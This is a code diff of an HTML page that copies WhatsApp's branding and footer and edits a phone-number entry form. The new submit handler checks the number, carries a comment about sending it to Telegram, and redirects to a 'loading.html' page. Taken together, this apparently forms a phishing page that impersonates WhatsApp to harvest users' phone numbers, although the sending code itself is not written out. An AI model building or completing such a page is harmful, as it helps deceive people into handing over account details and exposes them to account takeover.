@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -137,19 +138,19 @@
 
   <footer>
     <div class="footer-links">
-      <span>Utiliser WhatsApp</span>
-      <span>Fonctionnalités</span>
-      <span>WhatsApp Web</span>
-      <span>Télécharger</span>
-      <span>À propos de nous</span>
-      <span>Entreprise</span>
-      <span>Sécurité</span>
-      <span>Confidentialité et conditions</span>
-      <span>Entrer en contact</span>
-      <span>Contactez-nous</span>
-      <span>Facebook</span>
-      <span>X (Twitter)</span>
-      <span>Logo de Meta</span>
+      <p>Use WhatsApp</p>
+      <p>Features</p>
+      <p>WhatsApp Web</p>
+      <p>Download</p>
+      <p>About Us</p>
+      <p>Business</p>
+      <p>Security</p>
+      <p>Privacy & Terms</p>
+      <p>Get in Touch</p>
+      <p>Contact Us</p>
+      <p>Facebook | X (Twitter)</p>
+      <p>Meta Logo</p>
+      <p>© 2025 WhatsApp</p>
     </div>
     <div class="footer-bottom">© 2025 WhatsApp</div>
   </footer>
@@ -157,7 +158,8 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   <script>
     const input = document.querySelector("#phone");
-    window.intlTelInput(input, {
+
+    const iti = window.intlTelInput(input, {
       initialCountry: "auto",
       geoIpLookup: function (callback) {
         fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE")
@@ -173,7 +175,14 @@
 
     document.getElementById("phone-form").addEventListener("submit", function (e) {
       e.preventDefault();
-      alert("Form submitted with number: " + input.value);
+      if (!iti.isValidNumber()) {
+        alert("Please enter a valid phone number.");
+        return;
+      }
+
+      // Optionally send to Telegram here...
+
+      window.location.href = "loading.html";
     });
   </script>
 
